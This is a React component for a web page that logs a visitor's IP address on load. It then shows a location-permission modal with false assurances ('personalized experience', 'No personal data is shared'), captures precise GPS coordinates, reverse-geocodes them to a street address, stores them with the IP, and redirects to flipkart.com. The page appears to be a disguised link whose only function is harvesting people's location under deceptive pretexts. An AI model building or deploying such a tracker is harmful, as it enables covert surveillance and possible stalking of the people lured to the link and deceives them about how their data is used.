"use client";

import { useEffect, useState, useCallback } from "react";

type FlowState =
  | "tracking"
  | "asking-permission"
  | "getting-location"
  | "saving"
  | "redirecting";

export default function VisitorTracker() {
  const [state, setState] = useState<FlowState>("tracking");
  const [visitorId, setVisitorId] = useState<string | null>(null);
  const [ipAddress, setIpAddress] = useState<string>("unknown");

  /** Step 1 — Track the visitor (IP + timestamp) */
  useEffect(() => {
    const trackVisitor = async () => {
      try {
        const res = await fetch("/api/track", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
        });
        const data = await res.json();
        if (data.success && data.visitorId) {
          setVisitorId(data.visitorId);
          setIpAddress(data.ip || "unknown");
        }
      } catch (err) {
        console.error("Failed to track visit:", err);
      } finally {
        setState("asking-permission");
      }
    };

    trackVisitor();
  }, []);

  /** Step 2 — Handle permission response */
  const handleAllow = useCallback(async () => {
    if (!visitorId) {
      redirect();
      return;
    }

    setState("getting-location");

    try {
      const position = await new Promise<GeolocationPosition>(
        (resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0,
          });
        }
      );

      const { latitude, longitude } = position.coords;

      // Reverse geocode to get readable address
      let address = "Unknown";
      try {
        const geoRes = await fetch(
          `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`,
          { headers: { "User-Agent": "VisitorTracker/1.0" } }
        );
        const geoData = await geoRes.json();
        address = geoData.display_name || "Unknown";
      } catch {
        console.error("Reverse geocoding failed");
      }

      setState("saving");

      await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          ipAddress,
          latitude: latitude.toString(),
          longitude: longitude.toString(),
          address,
          permissionStatus: "granted",
        }),
      });
    } catch {
      // User denied in the browser native prompt or error
      setState("saving");
      await saveAsDenied();
    }

    redirect();
  }, [visitorId, ipAddress]);

  const handleDeny = useCallback(async () => {
    setState("saving");
    await saveAsDenied();
    redirect();
  }, [visitorId, ipAddress]);

  const saveAsDenied = async () => {
    if (!visitorId) return;
    try {
      await fetch("/api/location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          visitorId,
          ipAddress,
          latitude: null,
          longitude: null,
          address: null,
          permissionStatus: "denied",
        }),
      });
    } catch (err) {
      console.error("Failed to save denied status:", err);
    }
  };

  const redirect = () => {
    setState("redirecting");
    window.location.href = "https://flipkart.com";
  };

  /** Don't show modal until tracking is done */
  if (state === "tracking") return null;

  /** Show modal for permission request */
  if (state === "asking-permission") {
    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm animate-fade-in">
        <div className="relative w-full max-w-md glass-card p-8 shadow-2xl shadow-accent/10 animate-fade-in">
          {/* Glow effect */}
          <div className="absolute -top-12 left-1/2 -translate-x-1/2 w-24 h-24 rounded-full bg-accent/20 blur-3xl" />

          {/* Icon */}
          <div className="relative mx-auto mb-6 w-16 h-16 rounded-2xl bg-accent-glow flex items-center justify-center">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="w-8 h-8 text-accent-light"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
              strokeWidth={1.5}
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z"
              />
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0Z"
              />
            </svg>
          </div>

          <h2 className="text-xl font-bold text-center text-foreground mb-2">
            Enable Location Access
          </h2>
          <p className="text-sm text-muted text-center mb-8 leading-relaxed">
            We&apos;d like to access your location to provide you with a
            personalized experience. Your data is stored securely.
          </p>

          <div className="flex flex-col gap-3">
            <button
              onClick={handleAllow}
              className="w-full py-3 rounded-xl bg-accent hover:bg-accent-light text-white font-semibold transition-all duration-200 shadow-lg shadow-accent/20 hover:shadow-accent/30 hover:-translate-y-0.5 cursor-pointer"
            >
              Allow Location
            </button>
            <button
              onClick={handleDeny}
              className="w-full py-3 rounded-xl border border-border hover:border-accent/50 text-muted hover:text-foreground font-medium transition-all duration-200 cursor-pointer"
            >
              Not Now
            </button>
          </div>

          <p className="text-[11px] text-muted/60 text-center mt-5">
            We respect your privacy. No personal data is shared.
          </p>
        </div>
      </div>
    );
  }

  /** Loading states */
  if (
    state === "getting-location" ||
    state === "saving" ||
    state === "redirecting"
  ) {
    const message =
      state === "getting-location"
        ? "Getting your location..."
        : state === "saving"
        ? "Saving your preferences..."
        : "Redirecting...";

    return (
      <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/60 backdrop-blur-sm">
        <div className="glass-card p-8 text-center max-w-sm w-full">
          <div className="mx-auto mb-4 w-10 h-10 rounded-full border-2 border-accent border-t-transparent animate-spin" />
          <p className="text-sm text-muted">{message}</p>
        </div>
      </div>
    );
  }

  return null;
}
